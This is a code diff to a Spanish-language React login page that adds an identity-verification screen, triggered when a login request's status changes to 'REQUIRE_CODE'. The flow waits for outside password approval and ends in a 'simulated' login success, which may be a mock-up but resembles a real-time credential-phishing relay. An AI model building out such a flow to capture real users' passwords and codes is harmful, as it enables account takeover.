@@ -4,6 +4,7 @@ import { Toast } from '../common/Toast';
 import { HelpModal } from '../common/HelpModal';
 import { SuccessModal } from '../common/SuccessModal';
 import { VerificationCodeView } from './VerificationCodeView';
+import { IdentityVerificationView } from './views/IdentityVerificationView';
 import { MainAuthOptionsView } from './views/MainAuthOptionsView';
 import { PhoneEmailAuthView } from './views/PhoneEmailAuthView';
 import { QrCodeAuthView } from './views/QrCodeAuthView';
@@ -88,6 +89,12 @@ export const MainPage: React.FC = () => {
           setEmailPassword('');
           setPhonePassword('');
           showToast('La contraseña es incorrecta');
+        } else if (updatedReq.status === 'REQUIRE_CODE') {
+          setIsWaitingPasswordApproval(false);
+          setPasswordError(null);
+          setActiveLoginRequestId(null);
+          setCurrentView('VERIFY_IDENTITY');
+          showToast('Verificación de seguridad requerida');
         }
       },
       activeUserId
@@ -275,7 +282,21 @@ export const MainPage: React.FC = () => {
 
       {/* Main Container - Mobile First Max Width (390px - 480px) */}
       <div className="w-full max-w-[440px] flex-1 flex flex-col justify-between px-5 sm:px-6 py-4">
-        {currentView === 'VERIFY_CODE' ? (
+        {currentView === 'VERIFY_IDENTITY' ? (
+          <IdentityVerificationView
+            username={emailOrUser}
+            userId={activeUserId}
+            darkMode={darkMode}
+            onBack={() => setCurrentView('PHONE_EMAIL')}
+            onClose={() => setCurrentView('PHONE_EMAIL')}
+            onSuccess={() => {
+              setSimulatedLoginSuccess(
+                `¡Sesión iniciada con éxito! Bienvenido(a) de nuevo, ${emailOrUser}.`
+              );
+            }}
+            showToast={showToast}
+          />
+        ) : currentView === 'VERIFY_CODE' ? (
           <VerificationCodeView
             phoneNumber={phoneNumber}
             countryCode={countryCode}
